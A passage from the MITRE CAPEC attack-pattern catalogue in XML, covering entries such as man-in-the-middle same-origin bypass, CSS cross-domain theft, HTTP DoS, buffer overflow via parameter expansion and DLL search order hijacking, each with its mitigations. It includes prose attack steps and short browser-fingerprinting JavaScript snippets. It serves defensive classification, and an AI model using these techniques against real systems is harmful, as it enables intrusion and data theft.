            <Previous_Entry_Name Date="2015-12-07">Socket Capable Browser Plugins Result In Transparent Proxy Abuse</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="466" Name="Leveraging Active Man in the Middle Attacks to Bypass Same Origin Policy" Abstraction="Meta" Status="Draft">
         <Description>An attacker leverages a man in the middle attack in order to bypass the same origin policy protection in the victim's browser. This active man in the middle attack could be launched, for instance, when the victim is connected to a public WIFI hot spot. An attacker is able to intercept requests and responses between the victim's browser and some non-sensitive website that does not use TLS. For instance, the victim may be checking flight or weather information. When an attacker intercepts a response bound to the victim, an attacker adds an iFrame (which is possibly invisible) to the response referencing some domain with sensitive functionality and forwards the response to the victim. The victim's browser than automatically initiates an unauthorized request to the site with sensitive functionality. The same origin policy would prevent making these requests to a site other than the one from which the Java Script came, but the attacker once again uses active man in the middle to intercept these automatic requests and redirect them to the domain / service with sensitive functionality. Any persistent cookies that the victim has in his or her browser would be used for these unauthorized requests. The attacker thus actively directs the victim to a site with sensitive functionality. When the site with sensitive functionality responds back to the victim's request, an active man in the middle attacker intercepts these responses, injects his or her own malicious Java Script into these responses, and forwards to the victim's browser. In the victim's browser, that Java Script executes under the restrictions of the site with sensitive functionality and can essentially be used to continue to interact with the sensitive site. So an attacker can execute scripts within the victim's browser on any domains the attacker desires. The attacker is able to use this technique to steal cookies from the victim's browser for whatever site the attacker wants. This applies to both persistent cookies and HTTP only cookies (unlike traditional XSS attacks). An attacker is also able to use this technique to steal authentication credentials for sites that only encrypt the login form, but do not require a secure channel for the initial request to get to the page with the login form. Further the attacker is also able to steal any autocompletion information. This attack pattern can also be used to enable session fixation and cache poisoning attacks. Additional attacks can be enabled as well.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="94"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The victim and the attacker are both in an environment where an active man in the middle attack is possible (e.g., public WIFI hot spot)The victim visits at least one website that does not use TLS / SSL</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Ability to intercept and modify requests / responses</Skill>
            <Skill Level="Medium">Ability to create iFrame and JavaScript code that would initiate unauthorized requests to sensitive sites from the victim's browser</Skill>
            <Skill Level="Medium">Solid understanding of the HTTP protocol</Skill>
         </Skills_Required>
         <Mitigations>
            <Mitigation>
               <xhtml:p>Design: Tunnel communications through a secure proxy</xhtml:p>
               <xhtml:p>Design: Trust level separation for privileged / non privileged interactions (e.g., two different browsers, two different users, two different operating systems, two different virtual machines)</xhtml:p>
            </Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="300"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-403"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="467" Name="Cross Site Identification" Abstraction="Detailed" Status="Draft">
         <Description>An attacker harvests identifying information about a victim via an active session that the victim's browser has with a social networking site. A victim may have the social networking site open in one tab or perhaps is simply using the "remember me" feature to keep his or her session with the social networking site active. An attacker induces a payload to execute in the victim's browser that transparently to the victim initiates a request to the social networking site (e.g., via available social network site APIs) to retrieve identifying information about a victim. While some of this information may be public, the attacker is able to harvest this information in context and may use it for further attacks on the user (e.g., spear phishing). In one example of an attack, an attacker may post a malicious posting that contains an image with an embedded link. The link actually requests identifying information from the social networking site. A victim who views the malicious posting in his or her browser will have sent identifying information to the attacker, as long as the victim had an active session with the social networking site. There are many other ways in which the attacker may get the payload to execute in the victim's browser mainly by finding a way to hide it in some reputable site that the victim visits. The attacker could also send the link to the victim in an e-mail and trick the victim into clicking on the link. This attack is basically a cross site request forgery attack with two main differences. First, there is no action that is performed on behalf of the user aside from harvesting information. So standard CSRF protection may not work in this situation. Second, what is important in this attack pattern is the nature of the data being harvested, which is identifying information that can be obtained and used in context. This real time harvesting of identifying information can be used as a prelude for launching real time targeted social engineering attacks on the victim.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="62"/>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="408"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The victim has an active session with the social networking site.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">An attacker should be able to create a payload and deliver it to the victim's browser.</Skill>
            <Skill Level="Medium">An attacker needs to know how to interact with various social networking sites (e.g., via available APIs) to request information and how to send the harvested data back to the attacker.</Skill>
         </Skills_Required>
         <Mitigations>
            <Mitigation>
               <xhtml:p>Usage: Users should always explicitly log out from the social networking sites when done using them.</xhtml:p>
               <xhtml:p>Usage: Users should not open other tabs in the browser when using a social networking site.</xhtml:p>
            </Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="352"/>
            <Related_Weakness CWE_ID="359"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-404"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="468" Name="Generic Cross-Browser Cross-Domain Theft" Abstraction="Standard" Status="Draft">
         <Description>An attacker makes use of Cascading Style Sheets (CSS) injection to steal data cross domain from the victim's browser. The attack works by abusing the standards relating to loading of CSS: 1. Send cookies on any load of CSS (including cross-domain) 2. When parsing returned CSS ignore all data that does not make sense before a valid CSS descriptor is found by the CSS parser By having control of some text in the victim's domain, the attacker is able to inject a seemingly valid CSS string. It does not matter if this CSS string is preceded by other data. The CSS parser will still locate the CSS string. If the attacker is able to control two injection points, one before the cross domain data that the attacker is interested in receiving and the other one after, the attacker can use this attack to steal all of the data in between these two CSS injection points when referencing the injected CSS while performing rendering on the site that the attacker controls. When rendering, the CSS parser will detect the valid CSS string to parse and ignore the data that "does not make sense". That data will simply be rendered. That data is in fact the data that the attacker just stole cross domain. The stolen data may contain sensitive information, such CSRF protection tokens.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="242"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>No new lines can be present in the injected CSS stringProper HTML or URL escaping of the " and ' characters is not presentThe attacker has control of two injection points: pre-string and post-string</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Ability to craft a CSS injection</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Attacker controlled site/page to render a page referencing the injected CSS string</Resource>
         </Resources_Required>
         <Mitigations>
            <Mitigation>
               <xhtml:p>Design: Prior to performing CSS parsing, require the CSS to start with well-formed CSS when it is a cross-domain load and the MIME type is broken. This is a browser level fix.</xhtml:p>
               <xhtml:p>Implementation: Perform proper HTML encoding and URL escaping</xhtml:p>
            </Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="707"/>
            <Related_Weakness CWE_ID="149"/>
            <Related_Weakness CWE_ID="177"/>
            <Related_Weakness CWE_ID="838"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-405"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="469" Name="HTTP DoS" Abstraction="Standard" Status="Draft">
         <Description>An attacker performs flooding at the HTTP level to bring down only a particular web application rather than anything listening on a TCP/IP connection. This denial of service attack requires substantially fewer packets to be sent which makes DoS harder to detect. This is an equivalent of SYN flood in HTTP. The idea is to keep the HTTP session alive indefinitely and then repeat that hundreds of times. This attack targets resource depletion weaknesses in web server software. The web server will wait to attacker's responses on the initiated HTTP sessions while the connection threads are being exhausted.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="227"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>HTTP protocol is usedWeb server used is vulnerable to denial of service via HTTP flooding</Prerequisite>
         </Prerequisites>
         <Resources_Required>
            <Resource>Ability to issues hundreds of HTTP requests</Resource>
         </Resources_Required>
         <Mitigations>
            <Mitigation>
               <xhtml:p>Configuration: Configure web server software to limit the waiting period on opened HTTP sessions</xhtml:p>
               <xhtml:p>Design: Use load balancing mechanisms</xhtml:p>
            </Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="770"/>
            <Related_Weakness CWE_ID="772"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-406"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="47" Name="Buffer Overflow via Parameter Expansion" Abstraction="Detailed" Status="Draft">
         <Description>In this attack, the target software is given input that the attacker knows will be modified and expanded in size during processing. This attack relies on the target software failing to anticipate that the expanded data may exceed some internal limit, thereby creating a buffer overflow.</Description>
         <Likelihood_Of_Attack>Medium</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="100"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>Consider parts of the program where user supplied data may be expanded by the program. Use a disassembler and other reverse engineering tools to guide the search.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>Find a place where a buffer overflow occurs due to the fact that the new expanded size of the string is not correctly accounted for by the program. This may happen perhaps when the string is copied to another buffer that is big enough to hold the original, but not the expanded string. This may create an opportunity for planting the payload and redirecting program execution to the shell code.</Description>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>Write the buffer overflow exploit. To be exploitable, the "spill over" amount (e.g. the difference between the expanded string length and the original string length before it was expanded) needs to be sufficient to allow the overflow of the stack return pointer (in the case of a stack overflow), without causing a stack corruption that would crash the program before it gets to execute the shell code. Heap overflow will be more difficult and will require the attacker to get more lucky, by perhaps getting a chance to overwrite some of the accounting information stored as part of using malloc().</Description>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>The program expands one of the parameters passed to a function with input controlled by the user, but a later function making use of the expanded parameter erroneously considers the original, not the expanded size of the parameter.</Prerequisite>
            <Prerequisite>The expanded parameter is used in the context where buffer overflow may become possible due to the incorrect understanding of the parameter size (i.e. thinking that it is smaller than it really is).</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Finding this particular buffer overflow may not be trivial. Also, stack and especially heap based buffer overflows require a lot of knowledge if the intended goal is arbitrary code execution. Not only that the attacker needs to write the shell code to accomplish his or her goals, but the attacker also needs to find a way to get the program execution to jump to the planted shell code. There also needs to be sufficient room for the payload. So not every buffer overflow will be exploitable, even by a skilled attacker.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Access to the program source or binary. If the program is only available in binary then a disassembler and other reverse engineering tools will be helpful.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Scope>Authorization</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>Unreliable Execution</Impact>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Ensure that when parameter expansion happens in the code that the assumptions used to determine the resulting size of the parameter are accurate and that the new size of the parameter is visible to the whole system</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>Attack Example: FTP glob()</xhtml:p>
               <xhtml:p>The glob() function in FTP servers has been susceptible to attack as a result of incorrect resizing. This is an ftpd glob() Expansion LIST Heap Overflow Vulnerability. ftp daemon contains a heap-based buffer overflow condition. The overflow occurs when the LIST command is issued with an argument that expands into an oversized string after being processed by glob().</xhtml:p>
               <xhtml:p>This buffer overflow occurs in memory that is dynamically allocated. It may be possible for attackers to exploit this vulnerability and execute arbitrary code on the affected host.</xhtml:p>
               <xhtml:p>To exploit this, the attacker must be able to create directories on the target host.</xhtml:p>
               <xhtml:p>The glob() function is used to expand short-hand notation into complete file names. By sending to the FTP server a request containing a tilde (~) and other wildcard characters in the pathname string, a remote attacker can overflow a buffer and execute arbitrary code on the FTP server to gain root privileges. Once the request is processed, the glob() function expands the user input, which could exceed the expected length. In order to exploit this vulnerability, the attacker must be able to create directories on the FTP server.</xhtml:p>
               <xhtml:p>[R.47.1][REF-2]</xhtml:p>See also: CVE-2001-0249</Example>
            <Example>
               <xhtml:p>Buffer overflow in the glob implementation in libc in NetBSD-current before 20050914, and NetBSD 2.* and 3.* before 20061203, as used by the FTP daemon, allows remote authenticated users to execute arbitrary code via a long pathname that results from path expansion.</xhtml:p>
               <xhtml:p>The limit computation of an internal buffer was done incorrectly. The size of the buffer in byte was used as element count, even though the elements of the buffer are 2 bytes long. Long expanded path names would therefore overflow the buffer.</xhtml:p>See also: CVE-2006-6652</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="120"/>
            <Related_Weakness CWE_ID="119"/>
            <Related_Weakness CWE_ID="118"/>
            <Related_Weakness CWE_ID="130"/>
            <Related_Weakness CWE_ID="131"/>
            <Related_Weakness CWE_ID="74"/>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="680"/>
            <Related_Weakness CWE_ID="697"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-01-09</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="470" Name="Expanding Control over the Operating System from the Database" Abstraction="Detailed" Status="Draft">
         <Description>An attacker is able to leverage access gained to the database to read / write data to the file system, compromise the operating system, create a tunnel for accessing the host machine, and use this access to potentially attack other machines on the same network as the database machine. Traditionally SQL injections attacks are viewed as a way to gain unauthorized read access to the data stored in the database, modify the data in the database, delete the data, etc. However, almost every data base management system (DBMS) system includes facilities that if compromised allow an attacker complete access to the file system, operating system, and full access to the host running the database. The attacker can then use this privileged access to launch subsequent attacks. These facilities include dropping into a command shell, creating user defined functions that can call system level libraries present on the host machine, stored procedures, etc.</Description>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="66"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>A vulnerable DBMS is usedA SQL injection exists that gives an attacker access to the database or an attacker has access to the DBMS via other means</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Low level knowledge of the various facilities available in different DBMS systems for interacting with the file system and operating system</Skill>
         </Skills_Required>
         <Mitigations>
            <Mitigation>
               <xhtml:p>Design: Follow the defensive programming practices needed to protect an application accessing the database from SQL injection</xhtml:p>
               <xhtml:p>Configuration: Ensure that the DBMS is patched with the latest security patches</xhtml:p>
               <xhtml:p>Design: Ensure that the DBMS login used by the application has the lowest possible level of privileges in the DBMS</xhtml:p>
               <xhtml:p>Design: Ensure that DBMS runs with the lowest possible level of privileges on the host machine and that it runs as a separate user</xhtml:p>
               <xhtml:p>Usage: Do not use the DBMS machine for anything else other than the database</xhtml:p>
               <xhtml:p>Usage: Do not place any trust in the database host on the internal network. Authenticate and validate all network activity originating from the database host.</xhtml:p>
               <xhtml:p>Usage: Use an intrusion detection system to monitor network connections and logs on the database host.</xhtml:p>
               <xhtml:p>Implementation: Remove / disable all unneeded / unused functions of the DBMS system that may allow an attacker to elevate privileges if compromised</xhtml:p>
            </Mitigation>
         </Mitigations>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="250"/>
            <Related_Weakness CWE_ID="89"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-408"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="471" Name="Search Order Hijacking" Abstraction="Detailed" Status="Stable">
         <Description>An adversary exploits a weakness in an application's specification of external libraries to exploit the functionality of the loader where the process loading the library searches first in the same directory in which the process binary resides and then in other directories. Exploitation of this preferential search order can allow an attacker to make the loading process load the adversary's rogue library rather than the legitimate library. This attack can be leveraged with many different libraries and with many different loading processes. No forensic trails are left in the system's registry or file system that an incorrect library had been loaded.</Description>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="159"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Identify target general susceptibility] An attacker uses an automated tool or manually finds whether the target application uses dynamically linked libraries and the configuration file or look up table (such as Procedure Linkage Table) which contains the entries for dynamically linked libraries.</Description>
               <Technique>The attacker uses a tool such as the OSX "otool" utility or manually probes whether the target application uses dynamically linked libraries.</Technique>
               <Technique>The attacker finds the configuration files containing the entries to the dynamically linked libraries and modifies the entries to point to the malicious libraries the attacker crafted.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Craft malicious libraries] The attacker uses knowledge gained in the Explore phase to craft malicious libraries that he will redirect the target to leverage. These malicious libraries could have the same APIs as the legitimate library and additional malicious code.</Description>
               <Technique>The attacker monitors the file operations performed by the target application using a tool like dtrace or FileMon. And the attacker can delay the operations by using "sleep(2)" and "usleep()" to prepare the appropriate conditions for the attack, or make the application perform expansive tasks (large files parsing, etc.) depending on the purpose of the application.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Redirect the access to libraries to the malicious libraries] The attacker redirects the target to the malicious libraries he crafted in the Experiment phase. The attacker will be able to force the targeted application to execute arbitrary code when the application attempts to access the legitimate libraries.</Description>
               <Technique>The attacker modifies the entries in the configuration files pointing to the malicious libraries he crafted.</Technique>
               <Technique>The attacker leverages symlink/timing issues to redirect the target to access the malicious libraries he crafted. See also: CAPEC-132.</Technique>
               <Technique>The attacker leverages file search path order issues to redirect the target to access the malicious libraries he crafted. See also: CAPEC-38.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Attacker has a mechanism to place its malicious libraries in the needed location on the file system.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">Ability to create a malicious library.</Skill>
         </Skills_Required>
         <Mitigations>
            <Mitigation>
               <xhtml:p>Design: Fix the Windows loading process to eliminate the preferential search order by looking for DLLs in the precise location where they are expected</xhtml:p>
               <xhtml:p>Design: Sign system DLLs so that unauthorized DLLs can be detected.</xhtml:p>
            </Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>For instance, an attacker with access to the file system may place a malicious ntshrui.dll in the C:\Windows directory. This DLL normally resides in the System32 folder. Process explorer.exe which also resides in C:\Windows, upon trying to load the ntshrui.dll from the System32 folder will actually load the DLL supplied by the attacker simply because of the preferential search order. Since the attacker has placed its malicious ntshrui.dll in the same directory as the loading explorer.exe process, the DLL supplied by the attacker will be found first and thus loaded in lieu of the legitimate DLL. Since explorer.exe is loaded during the boot cycle, the attackers' malware is guaranteed to execute.</Example>
            <Example>macOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths. Adversaries can take advantage of ambiguous paths to plant dylibs to gain privilege escalation or persistence. A common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself. If the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="427"/>
         </Related_Weaknesses>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1038</Entry_ID>
               <Entry_Name>DLL search order hijacking</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1157</Entry_ID>
               <Entry_Name>Dylib Hijacking</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="ATTACK">
               <Entry_ID>1177</Entry_ID>
               <Entry_Name>LSASS Driver</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-409"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2015-11-09</Modification_Date>
               <Modification_Comment>Updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Phases, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description, Description Summary, Examples-Instances, References, Related_Weaknesses</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2018-07-31">DLL Search Order Hijacking</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="472" Name="Browser Fingerprinting" Abstraction="Detailed" Status="Draft">
         <Description>An attacker carefully crafts small snippets of Java Script to efficiently detect the type of browser the potential victim is using. Many web-based attacks need prior knowledge of the web browser including the version of browser to ensure successful exploitation of a vulnerability. Having this knowledge allows an attacker to target the victim with attacks that specifically exploit known or zero day weaknesses in the type and version of the browser used by the victim. Automating this process via Java Script as a part of the same delivery system used to exploit the browser is considered more efficient as the attacker can supply a browser fingerprinting method and integrate it with exploit code, all contained in Java Script and in response to the same web page request by the browser.</Description>
         <Typical_Severity>Low</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="541"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>Victim's browser visits a website that contains attacker's Java ScriptJava Script is not disabled in the victim's browser</Prerequisite>
         </Prerequisites>
         <Mitigations>
            <Mitigation>Configuration: Disable Java Script in the browser</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>The following code snippets can be used to detect various browsers:</xhtml:p>
               <xhtml:div style="margin-left:10px;">
                  <xhtml:div style="color:#32498D; font-weight:bold;">Firefox 2/3</xhtml:div>
                  <xhtml:div style="margin-left:10px;">FF=/a/[-1]=='a'</xhtml:div>
                  <xhtml:div style="color:#32498D; font-weight:bold;">Firefox 3</xhtml:div>
                  <xhtml:div style="margin-left:10px;">FF3=(function x(){})[-5]=='x'</xhtml:div>
                  <xhtml:div style="color:#32498D; font-weight:bold;">Firefox 2</xhtml:div>
                  <xhtml:div style="margin-left:10px;">FF2=(function x(){})[-6]=='x'</xhtml:div>
                  <xhtml:div style="color:#32498D; font-weight:bold;">IE</xhtml:div>
                  <xhtml:div style="margin-left:10px;">IE='\v'=='v'</xhtml:div>
                  <xhtml:div style="color:#32498D; font-weight:bold;">Safari</xhtml:div>
                  <xhtml:div style="margin-left:10px;">Saf=/a/.__proto__=='//'</xhtml:div>
                  <xhtml:div style="color:#32498D; font-weight:bold;">Chrome</xhtml:div>
                  <xhtml:div style="margin-left:10px;">Chr=/source/.test((/a/.toString+''))</xhtml:div>
                  <xhtml:div style="color:#32498D; font-weight:bold;">Opera</xhtml:div>
                  <xhtml:div style="margin-left:10px;">Op=/^function \(/.test([].sort)</xhtml:div>
               </xhtml:div>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="200"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-410"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="473" Name="Signature Spoof" Abstraction="Standard" Status="Draft">
         <Description>An attacker generates a message or datablock that causes the recipient to believe that the message or datablock was generated and cryptographically signed by an authoritative or reputable source, misleading a victim or victim operating system into performing malicious actions.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="151">
               <Exclude_Related Exclude_ID="512"/>
               <Exclude_Related Exclude_ID="403"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The victim or victim system is dependent upon a cryptographic signature-based verification system for validation of one or more security events or actions.</Prerequisite>
            <Prerequisite>The validation can be bypassed via an attacker-provided signature that makes it appear that the legitimate authoritative or reputable source provided the signature.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">Technical understanding of how signature verification algorithms work with data and applications</Skill>
         </Skills_Required>
         <Consequences><!--Privilege Escalation--><!--Privilege Escalation--><Consequence>
               <Scope>Access Control</Scope>
               <Scope>Authentication</Scope>
               <Impact>Gain Privileges</Impact>
            </Consequence>
         </Consequences>
         <Example_Instances>
            <Example>An attacker provides a victim with a malicious executable disguised as a legitimate executable from an established software by signing the executable with a forged cryptographic key. The victim's operating system attempts to verify the executable by checking the signature, the signature is considered valid, and the attackers' malicious executable runs.</Example>
            <Example>An attacker exploits weaknesses in a cryptographic algorithm to that allow a private key for a legitimate software vendor to be reconstructed, attacker-created malicious software is cryptographically signed with the reconstructed key, and is installed by the victim operating system disguised as a legitimate software update from the software vendor.</Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="20"/>
            <Related_Weakness CWE_ID="327"/>
            <Related_Weakness CWE_ID="290"/>
         </Related_Weaknesses>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
